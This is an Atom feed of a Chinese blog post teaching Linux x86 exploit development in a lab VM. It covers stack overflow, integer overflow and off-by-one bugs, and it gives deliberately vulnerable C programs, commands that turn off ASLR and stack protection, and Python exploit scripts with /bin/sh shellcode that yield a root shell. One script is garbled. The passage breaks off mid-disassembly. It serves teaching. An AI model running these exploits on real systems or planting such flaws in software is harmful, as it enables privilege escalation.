<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SZzzT&#39;s Blog</title>
  
  <subtitle>你错过的昨夜，曾有过，多么皎洁的月</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-21T03:49:08.729Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>SZzzT</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux (x86) Exploit 开发系列教程</title>
    <link href="http://yoursite.com/2019/07/20/Linux%20(x86)%20Exploit%20%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/07/20/Linux (x86) Exploit 开发系列教程/</id>
    <published>2019-07-20T09:24:57.000Z</published>
    <updated>2019-07-21T03:49:08.729Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="典型的基于堆栈的缓冲区溢出"><a href="#典型的基于堆栈的缓冲区溢出" class="headerlink" title="典型的基于堆栈的缓冲区溢出"></a>典型的基于堆栈的缓冲区溢出</h2><p><code>虚拟机：Ubuntu 12.04（x86）</code></p><p>目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv[])</span> </span>&#123;  </span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>上述漏洞代码中的<code>[2]行</code>显示里缓冲区溢出。这个bug可能导致任意代码执行，因为缓冲区内容是用户可以自行输入。</p><p><strong>gdb反汇编</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> szt@ubuntu:~/linux exploit/test1$ gdb -q test  </span><br><span class="line"> Reading symbols from /home/szt/linux exploit/test1/test...done.  </span><br><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code **<span class="keyword">for</span>** function main:  </span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:   <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span>  </span><br><span class="line">   <span class="number">0x0804841a</span> &lt;+<span class="number">6</span>&gt;:   sub    esp,<span class="number">0x110</span>  </span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048423</span> &lt;+<span class="number">15</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x08048426</span> &lt;+<span class="number">18</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048428</span> &lt;+<span class="number">20</span>&gt;:  mov    **DWORD** PTR [esp+<span class="number">0x4</span>],eax  </span><br><span class="line">   <span class="number">0x0804842c</span> &lt;+<span class="number">24</span>&gt;:  lea    eax,[esp+<span class="number">0x10</span>]  </span><br><span class="line">   <span class="number">0x08048430</span> &lt;+<span class="number">28</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048433</span> &lt;+<span class="number">31</span>&gt;:  call   <span class="number">0x8048330</span> &lt;<span class="built_in">strcpy</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">36</span>&gt;:  mov    eax,<span class="number">0x8048530</span>  </span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:  lea    edx,[esp+<span class="number">0x10</span>]  </span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:  mov    **DWORD** PTR [esp+<span class="number">0x4</span>],edx  </span><br><span class="line">   <span class="number">0x08048445</span> &lt;+<span class="number">49</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048448</span> &lt;+<span class="number">52</span>&gt;:  call   <span class="number">0x8048320</span> &lt;<span class="built_in">printf</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x0804844d</span> &lt;+<span class="number">57</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x08048452</span> &lt;+<span class="number">62</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048453</span> &lt;+<span class="number">63</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>由此可以推测出堆栈布局：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu1.png" title="图1"><p>首先我们可以发现<code>buf[]</code>有<code>256</code>个大小，并且<code>buf[]</code>之后的堆栈是返回地址。理论上如果填充大于<code>256</code>大小的数据到目标缓冲区中，那么会溢出，使得返回地址被多出来的数据所覆盖。所以我们发送一系列的<code>A</code>来测试。</p><p><strong>测试1：是否可以覆盖返回地址</strong></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu2.png" title="图2"><p>发现输出的<code>eip</code>已经是<code>0x41414141</code>，<code>0x41</code>是<code>A</code>的16进制。这样可以确定返回地址已经被我们发送的300个A覆盖了。</p><p>那么我们可以计算，返回地址距<code>buf[]</code> 偏移了多少。首先是<code>buf[]</code>自己的256大小，其次是8个大小对齐空间，然后是4个大小的ebp。</p><p><code>0x100 + 0x8 + 0x4=0x10c</code>  </p><p>所以偏移了<code>0x10c</code>个大小。</p><p>那么我们编写攻击代码<code>exp.py</code>来攻击</p><p><strong>攻击代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py   </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct  </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Stack address where shellcode is copied.  </span></span><br><span class="line"> ret_addr = <span class="number">0xbffff220</span>                           </span><br><span class="line"> <span class="comment">#Spawn a shell  </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh)  </span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">       <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numnk + RA + NOP<span class="string">'s + Shellcode  </span></span><br><span class="line"><span class="string">buf = "A" * 268  </span></span><br><span class="line"><span class="string">buf += conv(ret_addr)  </span></span><br><span class="line"><span class="string">buf += "\x90" * 100  </span></span><br><span class="line"><span class="string">buf += scode  </span></span><br><span class="line"><span class="string">print "Calling vulnerable program"  </span></span><br><span class="line"><span class="string">call(["./test", buf])</span></span><br></pre></td></tr></table></figure><p>执行上面的<code>exp.py</code>程序，给我们<code>root shell</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu3.png" title="图3"><hr><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p><code>虚拟机安装：Ubuntu 12.04（x86）</code></p><p>存储大于最大支持值的称为整数溢出。整数溢出本身不会导致任意代码执行，但是整数溢出可能会导致堆栈溢出或者堆溢出，这可能导致任意代码执行。</p><p>数据类型大小及范围：</p><p>!<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu4.png" title="图4"></p><blockquote><p>当我们存储一个大于最大值的值的时候，我们的值将会被包装。例如，当我们尝试将21645545422313存储到带符号的int数据类型时，它将被包装并存储为-21645545422313。</p></blockquote><p> 类似的，存储小于最小支持值的值称为整数下溢。例如，当我们尝试将-2147483649存储到带符号的int数据类型时，它将被包装并存储为21471483647.这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对于下溢也是一样的。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;     </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store_passwd_indb</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_uname</span><span class="params">(<span class="keyword">char</span>* uname)</span> </span>&#123;  </span><br><span class="line">&#125;     </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">validate_passwd</span><span class="params">(<span class="keyword">char</span>* passwd)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> passwd_buf[<span class="number">11</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd); <span class="comment">/* [1] */</span>   </span><br><span class="line"><span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123; <span class="comment">/* [2] */</span>  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>); <span class="comment">/* [3] */</span>   </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">   <span class="built_in">strcpy</span>(passwd_buf,passwd); <span class="comment">/* [4] */</span>  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>); <span class="comment">/* [5] */</span>  </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;  </span><br><span class="line">store_passwd_indb(passwd_buf); <span class="comment">/* [6] */</span>  </span><br><span class="line">&#125;     </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>) &#123;  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Usage Error:   \n"</span>);  </span><br><span class="line">       fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    validate_uname(argv[<span class="number">1</span>]);  </span><br><span class="line">    validate_passwd(argv[<span class="number">2</span>]);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$ gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o test test.c  </span><br><span class="line">$ sudo chown root test  </span><br><span class="line">$ sudo chgrp root test  </span><br><span class="line">$ sudo chmod + s test</span><br></pre></td></tr></table></figure><p>上述漏洞代码的[1]行显示了一个<code>整数溢出错误</code>。<code>strlen（）</code>的返回类型是<code>size_t（unsigned int）</code>，它存储在<code>unsigned char</code>数据类型中。因此，任何大于<code>unsigned char</code>的最大支持值的值都会导致整数溢出。因此当密码长度为261时，261将被包裹并存储为<code>passwd_len</code>变量中的<code>5</code>！由于这个整数溢出，可以绕过行<code>[2]</code>执行的边界检查，从而导致基于堆栈的缓冲区溢出！而且在这篇文章中看到，基于堆栈的缓冲区溢出导致任意的代码执行。</p><p>反汇编：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> szt@ubuntu:~/linux exploit/test2$ gdb -q test  </span><br><span class="line"> Reading symbols from /home/szt/linux exploit/test2/test...done.  </span><br><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code **<span class="keyword">for</span>** function main:  </span><br><span class="line">    <span class="number">0x0804852a</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">    <span class="number">0x0804852b</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">    <span class="number">0x0804852d</span> &lt;+<span class="number">3</span>&gt;:   <span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span>  </span><br><span class="line">    <span class="number">0x08048530</span> &lt;+<span class="number">6</span>&gt;:   sub    esp,<span class="number">0x10</span>  </span><br><span class="line">    <span class="number">0x08048533</span> &lt;+<span class="number">9</span>&gt;:   cmp    **DWORD** PTR [ebp+<span class="number">0x8</span>],<span class="number">0x3</span>  </span><br><span class="line">   <span class="number">0x08048537</span> &lt;+<span class="number">13</span>&gt;:  je     <span class="number">0x804855e</span> &lt;main+<span class="number">52</span>&gt;  </span><br><span class="line">   <span class="number">0x08048539</span> &lt;+<span class="number">15</span>&gt;:  mov    **DWORD** PTR [esp],<span class="number">0x8048680</span>  </span><br><span class="line">   <span class="number">0x08048540</span> &lt;+<span class="number">22</span>&gt;:  call   <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048545</span> &lt;+<span class="number">27</span>&gt;:  mov    eax,ds:<span class="number">0x804a020</span>  </span><br><span class="line">   <span class="number">0x0804854a</span> &lt;+<span class="number">32</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x0804854d</span> &lt;+<span class="number">35</span>&gt;:  call   <span class="number">0x8048380</span> &lt;fflush@plt&gt;  </span><br><span class="line">   <span class="number">0x08048552</span> &lt;+<span class="number">40</span>&gt;:  mov    **DWORD** PTR [esp],<span class="number">0xffffffff</span>  </span><br><span class="line">   <span class="number">0x08048559</span> &lt;+<span class="number">47</span>&gt;:  call   <span class="number">0x80483c0</span> &lt;<span class="built_in">exit</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x0804855e</span> &lt;+<span class="number">52</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048561</span> &lt;+<span class="number">55</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x08048564</span> &lt;+<span class="number">58</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048566</span> &lt;+<span class="number">60</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048569</span> &lt;+<span class="number">63</span>&gt;:  call   <span class="number">0x8048499</span> &lt;validate_uname&gt;  </span><br><span class="line">   <span class="number">0x0804856e</span> &lt;+<span class="number">68</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048571</span> &lt;+<span class="number">71</span>&gt;:  add    eax,<span class="number">0x8</span>  </span><br><span class="line">   <span class="number">0x08048574</span> &lt;+<span class="number">74</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048576</span> &lt;+<span class="number">76</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048579</span> &lt;+<span class="number">79</span>&gt;:  call   <span class="number">0x804849e</span> &lt;validate_passwd&gt;  </span><br><span class="line">   <span class="number">0x0804857e</span> &lt;+<span class="number">84</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x08048583</span> &lt;+<span class="number">89</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048584</span> &lt;+<span class="number">90</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p>堆栈布局：</p><p>!<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu5.png" title="图5"></p><p>由于我们已经知道长度为<code>261</code>的密码，所以绕过边界检查，并允许我们覆盖堆栈中的返回地址。让我们通过发送一系列的A来测试它。</p><p><strong>测试步骤1：是否可以覆盖返回地址？</strong></p><p>!<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu6.png" title="图6"></p><p>发现可以溢出，并且<code>eip</code>已经被<code>AAAA</code>覆盖了。</p><p><strong>测试步骤2：目的缓冲区的偏移量是多少？</strong></p><p>这里让我们从缓冲区<code>passwd_buf</code>中找出什么偏移返回地址。反汇编并绘制了<code>validate_passwd（）</code>的堆栈布局，现在可以尝试找到偏移位置信息。</p><p>首先是<code>0xb</code>个大小的<code>buf[]</code>,然后是<code>0x1</code>大小的<code>passwd_len</code>，然后是<code>0x4</code>个大小的对齐空间，最后是<code>0x4</code>个大小的<code>edi</code>和<code>0x4</code>个大小的调用者的<code>ebp</code>指针。</p><p><code>0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4</code>  </p><p>因此，用户输入的<code>“A” * 24 + “B” * 4 + “C” * 233</code>，以A覆盖<code>passwd_buf</code>，<code>passwd_len</code>，<code>对齐空间</code>，<code>edi</code>和调用者的<code>ebp</code>，以<code>BBBB</code>覆盖返回地址，以<code>C</code>覆盖剩余空间</p><p>!<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu7.png" title="图7"></p><p>发现<code>eip</code>已经被<code>BBBB</code>覆盖了。然后我们就能用上述漏洞编写一个攻击代码<code>exp.py</code></p><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py   </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct  </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> arg1 = <span class="string">"sploitfun"</span>  </span><br><span class="line"> <span class="comment">#Stack address where shellcode is copied.  </span></span><br><span class="line"> ret_addr = <span class="number">0xbffff274</span>  </span><br><span class="line"> <span class="comment">#Spawn a shell  </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh)  </span></span><br><span class="line"> scode =   <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment">#unk + RA + NOP's + Shellcode  </span></span><br><span class="line">arg2 = <span class="string">"A"</span> * <span class="number">24</span>  </span><br><span class="line">arg2 += conv(ret_addr);  </span><br><span class="line">arg2 += <span class="string">"\x90"</span> * <span class="number">100</span>  </span><br><span class="line">arg2 += scode  </span><br><span class="line">arg2 += <span class="string">"C"</span> * <span class="number">108</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, arg1, arg2])</span><br></pre></td></tr></table></figure><p>执行上面的<code>exp.py</code>程序，给我们<code>root shell</code></p><hr><h2 id="Off-By-One-漏洞-基于栈"><a href="#Off-By-One-漏洞-基于栈" class="headerlink" title="Off-By-One 漏洞 (基于栈)"></a>Off-By-One 漏洞 (基于栈)</h2><p><code>虚拟机安装：Ubuntu 12.04（x86）</code></p><p>将字符串复制到目标缓冲区可能导致<code>off by one</code>。当<code>源字符串长度等于目标缓冲区长度</code>，单个<code>null</code>字节将被复制到目标缓冲区上方。这里由于目标缓冲区位于堆栈中，所以单个null字节可以覆盖存储在堆栈中的调用者的ebp的最低有效位，这可能导致任意代码的执行。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;  </span><br><span class="line"> bar(arg); <span class="comment">/* [1] */</span>  </span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line"><span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span>  </span><br><span class="line">&#125;  </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;  </span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span>  </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);  </span><br><span class="line">         fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">         <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">   foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span>  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>上述漏洞代码的<code>第[2]行</code>是可能发生<code>off by one</code>溢出的地方。目标缓冲区长度为256，因此长度为256字节的源字符串可能导致任意代码执行。</p><p>使用称为<code>EBP覆盖</code>的技术实现任意代码执行。如果调用者的<code>EBP</code>位于目标缓冲区之上，则在<code>strcpy</code>之后，单个<code>NULL</code>字节将覆盖调用者<code>EBP</code>的<code>LSB</code>。</p><p><strong>反汇编：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 